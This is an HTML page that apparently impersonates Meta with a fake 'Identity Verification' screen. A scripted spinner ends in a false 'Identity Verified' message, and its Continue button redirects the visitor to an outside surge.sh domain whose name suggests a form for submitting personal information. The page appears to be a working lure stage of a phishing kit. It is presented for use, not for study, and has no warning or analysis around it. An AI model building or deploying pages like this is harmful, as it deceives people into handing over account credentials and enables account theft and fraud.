<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Meta | Identity Verification</title>
  <style>
    :root {
      --meta-blue: #0866FF;
      --meta-bg: #F0F2F5;
      --text-main: #1C1E21;
      --text-secondary: #65676B;
    }

    body {
      margin: 0;
      padding: 0;
      background-color: var(--meta-bg);
      font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .card {
      background: #ffffff;
      padding: 32px;
      border-radius: 8px;
      box-shadow: 0 12px 28px 0 rgba(0, 0, 0, 0.2), 0 2px 4px 0 rgba(0, 0, 0, 0.1);
      text-align: center;
      max-width: 450px;
      width: 90%;
    }

    .meta-logo {
      width: 120px;
      margin-bottom: 20px;
    }

    .verification-box {
      position: relative;
      width: 100px;
      height: 100px;
      margin: 0 auto 24px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .spinner {
      position: absolute;
      width: 100%;
      height: 100%;
      border: 4px solid #f3f3f3;
      border-top: 4px solid var(--meta-blue);
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    .check-mark {
      display: none;
      font-size: 60px;
      color: #31A24C; /* Facebook Success Green */
    }

    h2 {
      color: var(--text-main);
      font-size: 24px;
      margin: 0 0 8px 0;
      font-weight: 700;
    }

    p {
      color: var(--text-secondary);
      font-size: 15px;
      line-height: 1.4;
      margin-bottom: 24px;
    }

    .btn-continue {
      display: none;
      width: 100%;
      padding: 10px 0;
      background-color: var(--meta-blue);
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 17px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
    }

    .btn-continue:hover {
      background-color: #0756D7;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .footer-text {
      margin-top: 20px;
      font-size: 12px;
      color: #8a8d91;
    }
  </style>
</head>
<body>

  <div class="card">
    <svg class="meta-logo" viewBox="0 0 512 110" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M471.2 30.5c-12.7 0-20.1 7.4-20.1 19.5v32.2h-13.4V51.4c0-18.7 12.3-31.5 32-31.5 5.8 0 10.3.9 13.5 2.2l-3.3 11c-2.3-.9-5.4-1.4-8.7-1.4zM399.8 19.9c22.5 0 37.1 14.8 37.1 36.3 0 22.1-15 36.5-38.3 36.5-10.2 0-18.1-3-24.1-8.5l-1.3 7.1h-12.2l10.3-55.6c4.6-24.8 23.9-35.8 45.4-35.8 14.1 0 25.4 4.3 31.9 10.1l-6.1 10c-5-4.4-13.8-7.5-25.1-7.5-16.1 0-30.1 7.6-33.6 26.5l-1.5 8.1c5.3-5.2 13-7.7 22.6-7.7zm-4.7 58.7c14.6 0 23.5-9.3 23.5-22.6 0-13-8.8-22.3-22.6-22.3-10.6 0-18.8 6.1-22 16.5l-2.4 12.8c3.2 9 11.2 15.6 23.5 15.6zM281 33.3v13.5h20.7v10.6H281v18.7c0 5.4 2.6 7.9 7.9 7.9 3.5 0 6.6-.5 8.8-1.2l1.6 10c-3.1 1.2-8.3 1.9-14.1 1.9-12.7 0-17.7-6.9-17.7-17.6V57.4h-10.8V46.8h10.8V33.3H281zM196 23.3l-1.9 10.2c5.3-5.2 13.1-7.7 22.7-7.7 22.5 0 37.1 14.8 37.1 36.3 0 22.1-15 36.5-38.3 36.5-10.2 0-18.1-3-24.1-8.5l-4.5 24.1H175l17.8-95.6h12.2c-3.3 17.7-5.5 29.8-9 44.7zm18.8 55.3c14.6 0 23.5-9.3 23.5-22.6 0-13-8.8-22.3-22.6-22.3-10.6 0-18.8 6.1-22 16.5l-2.4 12.8c3.2 9 11.1 15.6 23.5 15.6z" fill="#0866FF"/>
      <path d="M123.6 57.5c-4.3-19.1-17.5-31.5-37.4-31.5-22.5 0-41.5 18.2-41.5 42.4 0 17 9.8 28.7 25 28.7 13.5 0 24.3-8.1 31.4-19.1h15.2c-8.9 19.5-27 30.5-47.1 30.5-31.1 0-51.5-23-51.5-54.3C17.7 28.7 40.5 5 78.5 5c25.4 0 46.5 12.8 56.4 34l-11.3 18.5z" fill="#0866FF"/>
    </svg>

    <div class="verification-box">
      <div class="spinner" id="spinner"></div>
      <div class="check-mark" id="checkMark">✓</div>
    </div>

    <h2 id="title">Security Check</h2>
    <p id="description">Please wait while we verify your identity to protect your Meta account.</p>

    <button class="btn-continue" id="btnContinue">Continue</button>

    <div class="footer-text">
      © Meta 2026. All rights reserved.
    </div>
  </div>

  <script>
    const nextUrl = "https://submit-your-info-to-helpform2-meta.surge.sh/";

    // Simulation sequence
    setTimeout(() => {
      document.getElementById('description').innerText = "Analyzing security protocols...";
    }, 1500);

    setTimeout(() => {
      // Hide Spinner
      document.getElementById('spinner').style.display = 'none';
      
      // Show Checkmark
      const check = document.getElementById('checkMark');
      check.style.display = 'block';
      
      // Update Texts
      document.getElementById('title').innerText = "Identity Verified";
      document.getElementById('description').innerText = "Your account has been secured successfully.";
      
      // Show Button
      document.getElementById('btnContinue').style.display = 'block';
    }, 4000);

    // Redirect
    document.getElementById('btnContinue').addEventListener('click', () => {
      window.location.href = nextUrl;
    });
  </script>

</body>
</html>
